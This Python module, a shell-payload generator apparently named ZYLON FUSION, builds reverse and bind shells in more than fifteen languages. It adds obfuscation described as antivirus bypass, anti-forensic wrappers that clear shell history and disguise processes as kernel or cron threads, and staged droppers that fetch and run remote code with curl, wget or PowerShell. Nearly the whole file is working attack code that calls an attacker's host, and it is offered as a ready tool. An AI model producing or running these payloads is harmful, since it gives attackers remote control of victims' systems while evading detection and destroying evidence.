#!/usr/bin/env python3
"""
ZYLON FUSION v5.0 - Shell Generator Advanced Engine
Fused from: RevShellGen + HoaxShell + OWASP ZSC + ShellValley
Capabilities:
  - Reverse shell generation for 15+ languages (Bash, Python, Perl, Ruby, PHP,
    Netcat, Socat, PowerShell, Java, C#, Go, Lua, Node.js, Tcl, Awk)
  - Obfuscation and encoding (Base64, URL encoding, hex encoding)
  - Shell payload encoding for AV bypass
  - Bind shell generation
  - Staged vs unstaged payloads
  - Meterpreter-like payload generation
  - Listener/handler setup assistance
  - Payload customization (IP, port, shell type)
  - Anti-forensic payload features
  - TUI-style interface
Termux Compatible | No Root Required | Python 3.13+
"""

import base64
import os
import re
import time
import random
import string
import hashlib
from datetime import datetime

from core.var import USER_AGENTS

# ============================================================================
# ANSI COLORS
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# REVERSE SHELL TEMPLATES (15+ languages)
# ============================================================================

REVERSE_SHELL_TEMPLATES = {
    "bash_tcp": {
        "lang": "Bash",
        "desc": "Bash TCP reverse shell",
        "template": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
    },
    "bash_udp": {
        "lang": "Bash",
        "desc": "Bash UDP reverse shell",
        "template": 'bash -i >& /dev/udp/{ip}/{port} 0>&1',
    },
    "bash_read_line": {
        "lang": "Bash",
        "desc": "Bash read-line reverse shell",
        "template": 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line;do $line 2>&5 >&5;done',
    },
    "python3": {
        "lang": "Python",
        "desc": "Python3 reverse shell",
        "template": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
    },
    "python3_ssl": {
        "lang": "Python",
        "desc": "Python3 SSL reverse shell",
        "template": '''python3 -c 'import socket,subprocess,os,ssl;s=socket.socket();s=ssl.wrap_socket(s);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
    },
    "perl": {
        "lang": "Perl",
        "desc": "Perl reverse shell",
        "template": '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
    },
    "ruby": {
        "lang": "Ruby",
        "desc": "Ruby reverse shell",
        "template": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
    },
    "php_exec": {
        "lang": "PHP",
        "desc": "PHP exec reverse shell",
        "template": '''php -r '$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
    },
    "php_shell": {
        "lang": "PHP",
        "desc": "PHP proc_open reverse shell",
        "template": '''php -r '$s=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);' ''',
    },
    "nc_e": {
        "lang": "Netcat",
        "desc": "Netcat -e reverse shell",
        "template": 'nc -e /bin/sh {ip} {port}',
    },
    "nc_mkfifo": {
        "lang": "Netcat",
        "desc": "Netcat mkfifo reverse shell",
        "template": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
    },
    "socat": {
        "lang": "Socat",
        "desc": "Socat reverse shell (TTY)",
        "template": 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}',
    },
    "powershell": {
        "lang": "PowerShell",
        "desc": "PowerShell reverse shell",
        "template": '''$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}};$c.Close()''',
    },
    "java": {
        "lang": "Java",
        "desc": "Java reverse shell",
        "template": '''Runtime rt = Runtime.getRuntime();String[] cmd = {{"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}};rt.exec(cmd);''',
    },
    "csharp": {
        "lang": "C#",
        "desc": "C# reverse shell",
        "template": '''using System;using System.Net.Sockets;using System.Text;class R{{static void Main(){{try{{var c=new TcpClient("{ip}",{port});var s=c.GetStream();while(true){{var b=new byte[65535];int r=s.Read(b,0,b.Length);if(r==0)break;var d=Encoding.ASCII.GetString(b,0,r);var p=new System.Diagnostics.Process{{StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+d){{RedirectStandardOutput=true,UseShellExecute=false,CreateNoWindow=true}}}};p.Start();var o=p.StandardOutput.ReadToEnd();s.Write(Encoding.ASCII.GetBytes(o),0,o.Length);}}}}catch{{}}}}''',
    },
    "golang": {
        "lang": "Go",
        "desc": "Go reverse shell",
        "template": '''package main;import("net";"os";"exec");func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}''',
    },
    "lua": {
        "lang": "Lua",
        "desc": "Lua reverse shell",
        "template": '''lua -e 'require("socket");require("os");t=socket.tcp();t:connect("{ip}","{port}");os.execute("/bin/sh -i <&3 >&3 2>&3");' ''',
    },
    "nodejs": {
        "lang": "Node.js",
        "desc": "Node.js reverse shell",
        "template": '''require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')''',
    },
    "nodejs_net": {
        "lang": "Node.js",
        "desc": "Node.js net reverse shell",
        "template": '''(function(){{var n=require('net'),c=require('child_process'),s=n.connect({port},'{ip}');s.pipe(c.spawn('/bin/sh',['-i']).stdin);c.spawn('/bin/sh',['-i']).stdout.pipe(s);c.spawn('/bin/sh',['-i']).stderr.pipe(s);}})()''',
    },
    "tcl": {
        "lang": "Tcl",
        "desc": "Tcl reverse shell",
        "template": '''echo 'set s [socket {ip} {port}];while 1 {{puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {{[catch {{set r [eval $e]}} err]}} {{set r "Error: $err"}};puts $s $r;flush $s}};close $s;' | tclsh''',
    },
    "awk": {
        "lang": "Awk",
        "desc": "Awk reverse shell",
        "template": '''awk 'BEGIN{{s="/inet/tcp/0/{ip}/{port}";while(1){{do{{printf"$ "|&s;s|&getline c;if(c){{while((c|&getline)>0)print$0|&s;close(c)}}}}while(c!="exit")}}}}' ''',
    },
}

# ============================================================================
# BIND SHELL TEMPLATES
# ============================================================================

BIND_SHELL_TEMPLATES = {
    "bash": {
        "lang": "Bash",
        "desc": "Bash bind shell (mkfifo)",
        "template": 'mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l -p {port} >/tmp/f',
    },
    "python3": {
        "lang": "Python",
        "desc": "Python3 bind shell",
        "template": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
    },
    "perl": {
        "lang": "Perl",
        "desc": "Perl bind shell",
        "template": '''perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);while(c=accept(C,S)){if(!fork){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}}' ''',
    },
    "nc_e": {
        "lang": "Netcat",
        "desc": "Netcat bind shell",
        "template": 'nc -l -p {port} -e /bin/sh',
    },
    "php": {
        "lang": "PHP",
        "desc": "PHP bind shell",
        "template": '''php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$c=socket_accept($s);while(1){socket_write($c,"$ ",2);$d=socket_read($c,4096);$o=shell_exec($d." 2>&1");socket_write($c,$o);}' ''',
    },
    "ruby": {
        "lang": "Ruby",
        "desc": "Ruby bind shell",
        "template": '''ruby -rsocket -e'f=TCPServer.open({port}).accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
    },
    "socat": {
        "lang": "Socat",
        "desc": "Socat bind shell",
        "template": 'socat TCP-LISTEN:{port},fork EXEC:/bin/sh',
    },
    "powershell": {
        "lang": "PowerShell",
        "desc": "PowerShell bind shell",
        "template": '''$l=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}};$c.Close();$l.Stop()''',
    },
}

# ============================================================================
# LISTENER TEMPLATES
# ============================================================================

LISTENER_TEMPLATES = {
    "nc": "nc -lvnp {port}",
    "ncat": "ncat -lvnp {port}",
    "socat": "socat TCP-LISTEN:{port},reuseaddr,fork STDOUT",
    "rlwrap_nc": "rlwrap nc -lvnp {port}",
    "python": f'''python3 -c 'import socket;s=socket.socket();s.bind(("0.0.0.0",{{port}}));s.listen(1);print("[ZYLON] Listening on port {{port}}...");c,a=s.accept();print(f"[ZYLON] Connection from {{a}}");import sys,threading;def rx():[sys.stdout.buffer.write(c.recv(4096)) or sys.stdout.flush() for _ in iter(int,1)];threading.Thread(target=rx,daemon=True).start();[c.send((input()+"\\n").encode()) for _ in iter(int,1)]' ''',
    "powershell": "pwsh -c '$l=[System.Net.Sockets.TcpListener]{port};$l.Start()'",
}

# ============================================================================
# OBFUSCATION ENGINE
# ============================================================================

def _variable_split_obfuscate(shell_code):
    """Split shell code into variables for obfuscation"""
    var_names = [''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) for _ in range(5)]
    parts = [shell_code[i:i + max(1, len(shell_code) // 4 + 1)] for i in range(0, len(shell_code), max(1, len(shell_code) // 4 + 1))]
    while len(parts) < 5:
        parts.append("")
    result = ""
    for i, part in enumerate(parts[:5]):
        if part:
            result += f'{var_names[i]}="{part}";'
    result += f'eval "${var_names[0]}${var_names[1]}${var_names[2]}${var_names[3]}${var_names[4]}"'
    return result


def _whitespace_obfuscate(shell_code):
    """Add random whitespace and comments for obfuscation"""
    result = ""
    for char in shell_code:
        result += char
        if random.random() < 0.08 and char in ' ;|&':
            result += '#' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    return result


def _env_var_obfuscate(shell_code):
    """Replace paths with environment variables"""
    result = shell_code.replace("/bin/sh", "${SHELL:-/bin/sh}")
    result = result.replace("/bin/bash", "${BASH:-/bin/bash}")
    result = result.replace("/bin/cat", "$(which cat)")
    return result


def _string_reverse_obfuscate(shell_code):
    """Reverse string obfuscation"""
    reversed_code = shell_code[::-1]
    return f'echo {reversed_code} | rev | bash'


def _hex_obfuscate(shell_code):
    """Hex encoding obfuscation"""
    hex_str = shell_code.encode().hex()
    return f'echo {hex_str} | xxd -r -p | bash'


OBFUSCATION_METHODS = {
    "base64": lambda s: f'echo {base64.b64encode(s.encode()).decode()} | base64 -d | bash',
    "base64_double": lambda s: f'echo {base64.b64encode(base64.b64encode(s.encode())).decode()} | base64 -d | base64 -d | bash',
    "hex": _hex_obfuscate,
    "url": lambda s: __import__('urllib.parse').quote(s),
    "variable_split": _variable_split_obfuscate,
    "whitespace": _whitespace_obfuscate,
    "env_var": _env_var_obfuscate,
    "string_reverse": _string_reverse_obfuscate,
    "xor_base64": lambda s: _xor_obfuscate(s),
}


def _xor_obfuscate(shell_code):
    """XOR + Base64 obfuscation for AV bypass"""
    key = random.randint(1, 255)
    xored = bytes([b ^ key for b in shell_code.encode()])
    b64 = base64.b64encode(xored).decode()
    return f'echo "{b64}" | base64 -d | python3 -c "import sys;xor_key={key};data=sys.stdin.buffer.read();sys.stdout.buffer.write(bytes([b^xor_key for b in data]))" | bash'


# ============================================================================
# ANTI-FORENSIC FEATURES
# ============================================================================

ANTI_FORENSIC_WRAPPERS = {
    "history_clear": lambda s: s + '; history -c 2>/dev/null; export HISTFILE=/dev/null; unset HISTFILE',
    "process_hide": lambda s: s.replace('bash', '$0').replace('/bin/sh', 'exec -a [kworker/0:1] /bin/sh'),
    "timeout_kill": lambda s: f'( {s} ) & PID=$!; sleep 3600; kill $PID 2>/dev/null',
    "parent_deceive": lambda s: s.replace('/bin/sh', '/bin/sh -c "exec -a [cron] /bin/sh"'),
}


# ============================================================================
# SHELLGEN ADVANCED ENGINE
# ============================================================================

class ShellGenAdvancedEngine:
    """
    Shell Generator Advanced Engine
    Fused from RevShellGen + HoaxShell + OWASP ZSC + ShellValley
    Supports 15+ languages, obfuscation, encoding, staged payloads,
    bind shells, meterpreter-like payloads, and anti-forensics.
    """

    def __init__(self, lhost=None, lport=4444):
        self.lhost = lhost
        self.lport = lport

    # ========================================================================
    # GENERATE REVERSE SHELL
    # ========================================================================

    def generate_reverse_shell(self, ip, port, lang='bash'):
        """Generate reverse shell payload for specified language"""
        if not ip:
            return {
                'vulnerable': False,
                'findings': [],
                'details': {'error': 'No IP address specified'},
                'scan_type': 'reverse_shell_generate'
            }

        # Find matching template by language
        matching = {}
        for name, tmpl in REVERSE_SHELL_TEMPLATES.items():
            if tmpl['lang'].lower() == lang.lower() or name.lower() == lang.lower():
                matching[name] = tmpl

        if not matching:
            available_langs = sorted(set(t['lang'] for t in REVERSE_SHELL_TEMPLATES.values()))
            return {
                'vulnerable': False,
                'findings': [],
                'details': {
                    'error': f'Unknown language: {lang}',
                    'available_languages': available_langs,
                    'available_shells': list(REVERSE_SHELL_TEMPLATES.keys()),
                },
                'scan_type': 'reverse_shell_generate'
            }

        payloads = []
        for name, tmpl in matching.items():
            try:
                payload = tmpl['template'].format(ip=ip, port=port)
                payloads.append({
                    'name': name,
                    'language': tmpl['lang'],
                    'description': tmpl['desc'],
                    'payload': payload,
                    'payload_size': len(payload),
                    'listener_cmd': f'nc -lvnp {port}',
                })
            except (KeyError, IndexError):
                continue

        print(f"{GREEN}[+] Generated {len(payloads)} reverse shell(s) for {lang}{RESET}")
        for p in payloads:
            print(f"  {CYAN}[{p['name']}]{RESET} {p['description']} ({p['payload_size']} bytes)")

        return {
            'vulnerable': True,
            'findings': payloads,
            'details': {
                'ip': ip,
                'port': port,
                'language': lang,
                'total_payloads': len(payloads),
                'payloads_generated': [p['name'] for p in payloads],
            },
            'scan_type': 'reverse_shell_generate'
        }

    # ========================================================================
    # GENERATE BIND SHELL
    # ========================================================================

    def generate_bind_shell(self, port, lang='bash'):
        """Generate bind shell payload for specified language"""
        matching = {}
        for name, tmpl in BIND_SHELL_TEMPLATES.items():
            if tmpl['lang'].lower() == lang.lower() or name.lower() == lang.lower():
                matching[name] = tmpl

        if not matching:
            available_langs = sorted(set(t['lang'] for t in BIND_SHELL_TEMPLATES.values()))
            return {
                'vulnerable': False,
                'findings': [],
                'details': {
                    'error': f'No bind shell for language: {lang}',
                    'available_languages': available_langs,
                },
                'scan_type': 'bind_shell_generate'
            }

        payloads = []
        for name, tmpl in matching.items():
            try:
                payload = tmpl['template'].format(port=port)
                connect_cmd = f'nc {self.lhost or "TARGET_IP"} {port}'
                payloads.append({
                    'name': name,
                    'language': tmpl['lang'],
                    'description': tmpl['desc'],
                    'payload': payload,
                    'payload_size': len(payload),
                    'connect_command': connect_cmd,
                })
            except (KeyError, IndexError):
                continue

        print(f"{GREEN}[+] Generated {len(payloads)} bind shell(s) for {lang}{RESET}")

        return {
            'vulnerable': True,
            'findings': payloads,
            'details': {
                'port': port,
                'language': lang,
                'total_payloads': len(payloads),
            },
            'scan_type': 'bind_shell_generate'
        }

    # ========================================================================
    # OBFUSCATE PAYLOAD
    # ========================================================================

    def obfuscate_payload(self, payload, method='base64'):
        """Obfuscate shell payload using specified method"""
        if method not in OBFUSCATION_METHODS:
            return {
                'vulnerable': False,
                'findings': [],
                'details': {
                    'error': f'Unknown obfuscation method: {method}',
                    'available_methods': list(OBFUSCATION_METHODS.keys()),
                },
                'scan_type': 'shell_obfuscation'
            }

        try:
            obfuscated = OBFUSCATION_METHODS[method](payload)
            all_obfuscated = {}
            for m, func in OBFUSCATION_METHODS.items():
                try:
                    all_obfuscated[m] = func(payload)
                except Exception:
                    all_obfuscated[m] = "Error generating"

            print(f"{GREEN}[+] Payload obfuscated using {method}{RESET}")
            print(f"  {DIM}Original size: {len(payload)} | Obfuscated size: {len(obfuscated)}{RESET}")

            return {
                'vulnerable': True,
                'findings': [{
                    'method': method,
                    'original_payload': payload,
                    'obfuscated_payload': obfuscated,
                    'original_size': len(payload),
                    'obfuscated_size': len(obfuscated),
                    'size_increase': len(obfuscated) - len(payload),
                }],
                'details': {
                    'method': method,
                    'original_size': len(payload),
                    'obfuscated_size': len(obfuscated),
                    'all_methods': all_obfuscated,
                    'anti_forensic_options': list(ANTI_FORENSIC_WRAPPERS.keys()),
                },
                'scan_type': 'shell_obfuscation'
            }
        except Exception as e:
            return {
                'vulnerable': False,
                'findings': [],
                'details': {'error': str(e)},
                'scan_type': 'shell_obfuscation'
            }

    # ========================================================================
    # GENERATE LISTENER COMMAND
    # ========================================================================

    def generate_listener(self, port):
        """Generate listener/handler setup commands"""
        listeners = {}
        for name, tmpl in LISTENER_TEMPLATES.items():
            try:
                listeners[name] = tmpl.format(port=port)
            except (KeyError, IndexError):
                listeners[name] = tmpl

        # Stabilization commands
        stabilization = [
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "export TERM=xterm",
            "stty rows 38 cols 136",
            "Ctrl+Z then: stty raw -echo; fg",
            "echo 'set nowrap' >> ~/.screenrc",
        ]

        print(f"{GREEN}[+] Generated listener commands for port {port}{RESET}")

        return {
            'vulnerable': True,
            'findings': [{
                'listener_type': name,
                'command': cmd,
            } for name, cmd in listeners.items()],
            'details': {
                'port': port,
                'listeners': listeners,
                'stabilization_commands': stabilization,
                'recommended': 'rlwrap nc -lvnp {port}'.format(port=port),
                'ssl_listener': f'openssl s_server -accept {port} -cert server.pem -key server.pem',
            },
            'scan_type': 'listener_generate'
        }

    # ========================================================================
    # GENERATE STAGED PAYLOAD
    # ========================================================================

    def generate_staged_payload(self, ip, port, stage=1):
        """
        Generate staged payload (meterpreter-like)
        Stage 1: Small dropper that fetches stage 2
        Stage 2: Full payload
        """
        if stage == 1:
            # Stage 1: Small dropper
            session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

            stage1_payloads = {
                "bash_dropper": f'curl -s http://{ip}:{port}/{session_id}.sh | bash',
                "wget_dropper": f'wget -qO- http://{ip}:{port}/{session_id}.sh | bash',
                "python_dropper": f'python3 -c "import urllib.request;exec(urllib.request.urlopen(\'http://{ip}:{port}/{session_id}.py\').read())"',
                "powershell_dropper": f'IEX(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/{session_id}.ps1\')',
            }

            # Stage 2: Full reverse shell (served by listener)
            stage2_payloads = {
                "bash_stage2": f'bash -i >& /dev/tcp/{ip}/{port+1} 0>&1',
                "python_stage2": f'''python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port+1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            }

            # HTTP server command to serve stages
            server_cmd = f'python3 -m http.server {port}'

            print(f"{GREEN}[+] Staged payload generated (Stage 1: dropper, Stage 2: payload){RESET}")

            return {
                'vulnerable': True,
                'findings': [{
                    'stage': 1,
                    'name': name,
                    'payload': payload,
                    'payload_size': len(payload),
                    'description': f'Stage 1 dropper - fetches from http://{ip}:{port}/',
                } for name, payload in stage1_payloads.items()],
                'details': {
                    'ip': ip,
                    'port': port,
                    'session_id': session_id,
                    'stage1_payloads': stage1_payloads,
                    'stage2_payloads': stage2_payloads,
                    'server_command': server_cmd,
                    'anti_forensic': True,
                },
                'scan_type': 'staged_payload_generate'
            }
        else:
            # Direct stage 2 payload
            payload = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
            return {
                'vulnerable': True,
                'findings': [{
                    'stage': 2,
                    'name': 'bash_reverse',
                    'payload': payload,
                    'payload_size': len(payload),
                }],
                'details': {
                    'ip': ip,
                    'port': port,
                    'stage': 2,
                },
                'scan_type': 'staged_payload_generate'
            }

    # ========================================================================
    # LIST ALL SHELLS
    # ========================================================================

    def list_shells(self):
        """List all available shell types"""
        reverse_shells = {}
        for name, tmpl in REVERSE_SHELL_TEMPLATES.items():
            reverse_shells[name] = {
                'language': tmpl['lang'],
                'description': tmpl['desc'],
            }

        bind_shells = {}
        for name, tmpl in BIND_SHELL_TEMPLATES.items():
            bind_shells[name] = {
                'language': tmpl['lang'],
                'description': tmpl['desc'],
            }

        languages = sorted(set(t['lang'] for t in REVERSE_SHELL_TEMPLATES.values()))

        print(f"{CYAN}[ZYLON SHELLGEN] Available shells:{RESET}")
        print(f"  {GREEN}Reverse shells: {len(reverse_shells)}{RESET}")
        print(f"  {GREEN}Bind shells: {len(bind_shells)}{RESET}")
        print(f"  {GREEN}Languages: {', '.join(languages)}{RESET}")

        return {
            'vulnerable': True,
            'findings': [],
            'details': {
                'reverse_shells': reverse_shells,
                'bind_shells': bind_shells,
                'languages': languages,
                'total_reverse': len(reverse_shells),
                'total_bind': len(bind_shells),
                'obfuscation_methods': list(OBFUSCATION_METHODS.keys()),
                'anti_forensic_methods': list(ANTI_FORENSIC_WRAPPERS.keys()),
            },
            'scan_type': 'list_shells'
        }

    # ========================================================================
    # FULL PAYLOAD GENERATION
    # ========================================================================

    def full_generation(self, ip=None, port=4444):
        """
        Full shell payload generation - all types with obfuscation
        """
        target_ip = ip or self.lhost or "ATTACKER_IP"
        print(f"{BOLD}{RED}[ZYLON SHELLGEN] Full Payload Generation{RESET}")
        print(f"{CYAN}[*] IP: {target_ip} | Port: {port}{RESET}")

        results = {}

        # Phase 1: Generate all reverse shells
        print(f"\n{CYAN}=== Phase 1: Reverse Shell Generation ==={RESET}")
        results['reverse'] = self.generate_reverse_shell(target_ip, port, lang='bash')

        # Phase 2: Generate bind shells
        print(f"\n{MAGENTA}=== Phase 2: Bind Shell Generation ==={RESET}")
        results['bind'] = self.generate_bind_shell(port, lang='bash')

        # Phase 3: Generate obfuscated versions
        print(f"\n{YELLOW}=== Phase 3: Obfuscation ==={RESET}")
        bash_payload = f'bash -i >& /dev/tcp/{target_ip}/{port} 0>&1'
        results['obfuscated'] = self.obfuscate_payload(bash_payload, method='base64')

        # Phase 4: Generate staged payload
        print(f"\n{CYAN}=== Phase 4: Staged Payload ==={RESET}")
        results['staged'] = self.generate_staged_payload(target_ip, port, stage=1)

        # Phase 5: Generate listener commands
        print(f"\n{MAGENTA}=== Phase 5: Listener Setup ==={RESET}")
        results['listener'] = self.generate_listener(port)

        total_payloads = sum(
            len(r.get('findings', [])) if isinstance(r.get('findings'), list) else 1
            for r in results.values()
        )

        print(f"\n{BOLD}{GREEN}[+] Full generation complete: {total_payloads} total payloads{RESET}")

        return {
            'vulnerable': True,
            'findings': results,
            'details': {
                'ip': target_ip,
                'port': port,
                'total_payloads': total_payloads,
                'phases': ['reverse_shells', 'bind_shells', 'obfuscation', 'staged_payloads', 'listeners'],
            },
            'scan_type': 'shell_payload_full_gen'
        }

    # ========================================================================
    # MAIN ENTRY
    # ========================================================================

    def run(self, target=None, scan_type='generate', **kwargs):
        """Main entry point"""
        ip = kwargs.pop('ip', target or self.lhost or None)
        port = kwargs.pop('port', self.lport)
        lang = kwargs.pop('lang', 'bash')
        method = kwargs.pop('method', 'base64')

        scan_map = {
            'generate': lambda: self.generate_reverse_shell(ip, port, lang=lang),
            'reverse_shell': lambda: self.generate_reverse_shell(ip, port, lang=lang),
            'bind_shell': lambda: self.generate_bind_shell(port, lang=lang),
            'obfuscate': lambda: self.obfuscate_payload(kwargs.get('payload', ''), method=method),
            'listener': lambda: self.generate_listener(port),
            'staged': lambda: self.generate_staged_payload(ip, port, stage=kwargs.get('stage', 1)),
            'list': lambda: self.list_shells(),
            'full': lambda: self.full_generation(ip=ip, port=port),
        }

        if scan_type in scan_map:
            return scan_map[scan_type]()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {'error': f'Unknown scan type: {scan_type}', 'available': list(scan_map.keys())},
            'scan_type': scan_type
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target=None, scan_type='generate', **kwargs):
    """
    Module-level run function for ZYLON FUSION integration.
    Returns dict: 'vulnerable', 'findings', 'details', 'scan_type'
    """
    ip = kwargs.pop('ip', target)
    port = kwargs.pop('port', 4444)
    engine = ShellGenAdvancedEngine(lhost=ip, lport=port)
    return engine.run(target=target, scan_type=scan_type, ip=ip, port=port, **kwargs)
